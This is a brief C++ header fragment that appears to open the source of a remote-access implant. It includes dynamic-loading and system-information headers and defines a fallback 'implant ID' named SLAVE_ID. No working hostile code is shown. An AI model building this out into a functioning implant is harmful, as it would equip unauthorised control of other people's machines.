
#include <iostream>
#include <string.h>
#include <dlfcn.h>

// For JSON parsing.
#include <map>
#include <vector>
#include <sstream>

// Get computer information
#include <sys/utsname.h>

// Check if the compiler gives us a implant ID else use the fake one.
#ifndef SLAVE_ID
    #define SLAVE_ID "TEST_SLAVE_ID"
#endif